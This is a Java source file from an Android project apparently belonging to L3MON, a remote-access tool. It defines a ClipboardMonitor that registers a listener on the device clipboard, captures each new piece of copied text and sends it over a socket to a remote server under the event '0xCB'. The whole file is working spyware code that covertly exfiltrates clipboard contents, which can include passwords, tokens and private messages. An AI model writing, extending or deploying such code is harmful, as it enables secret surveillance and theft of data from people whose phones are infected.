package com.etechd.l3mon.features.clipboard;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.text.TextUtils;
import android.util.Log;

import com.etechd.l3mon.core.network.SocketClient;

import org.json.JSONException;
import org.json.JSONObject;

public final class ClipboardMonitor {

	private static final String TAG = "ClipboardMonitor";
	private static ClipboardMonitor instance;

	private final Context context;
	private ClipboardManager clipboardManager;
	private ClipboardManager.OnPrimaryClipChangedListener clipboardListener;
	private String lastSentText;

	private ClipboardMonitor(Context context) {
		this.context = context.getApplicationContext();
	}

	public static synchronized ClipboardMonitor getInstance(Context context) {
		if (instance == null) {
			instance = new ClipboardMonitor(context);
		}
		return instance;
	}

	public synchronized void start() {
		ensureClipboardManager();
		if (clipboardManager == null) {
			Log.w(TAG, "Clipboard service unavailable");
			return;
		}

		if (clipboardListener != null) {
			return;
		}

		clipboardListener = () -> emitClipboardSnapshot(false);

		try {
			clipboardManager.addPrimaryClipChangedListener(clipboardListener);
			emitClipboardSnapshot(true);
		} catch (Exception e) {
			Log.e(TAG, "Failed to register clipboard listener", e);
		}
	}

	public synchronized void stop() {
		if (clipboardManager != null && clipboardListener != null) {
			try {
				clipboardManager.removePrimaryClipChangedListener(clipboardListener);
			} catch (Exception e) {
				Log.w(TAG, "Failed to remove clipboard listener", e);
			}
		}
		clipboardListener = null;
		lastSentText = null;
	}

	public synchronized void emitClipboardSnapshot() {
		emitClipboardSnapshot(true);
	}

	private void emitClipboardSnapshot(boolean allowDuplicate) {
		ensureClipboardManager();
		if (clipboardManager == null || !clipboardManager.hasPrimaryClip()) {
			return;
		}

		ClipData clip = clipboardManager.getPrimaryClip();
		if (clip == null || clip.getItemCount() == 0) {
			return;
		}

		ClipData.Item item = clip.getItemAt(0);
		CharSequence text = item != null ? item.getText() : null;
		if (TextUtils.isEmpty(text)) {
			return;
		}

		String payload = text.toString();
		if (!allowDuplicate && payload.equals(lastSentText)) {
			return;
		}

		sendClipboard(payload);
	}

	private void sendClipboard(String text) {
		try {
			JSONObject data = new JSONObject();
			data.put("text", text);
			SocketClient.getInstance().getSocket().emit("0xCB", data);
			lastSentText = text;
		} catch (JSONException e) {
			Log.e(TAG, "Clipboard JSON error", e);
		} catch (Exception e) {
			Log.e(TAG, "Failed to send clipboard data", e);
		}
	}

	private void ensureClipboardManager() {
		if (clipboardManager == null) {
			try {
				clipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
			} catch (Exception e) {
				Log.e(TAG, "Failed to obtain clipboard service", e);
			}
		}
	}
}
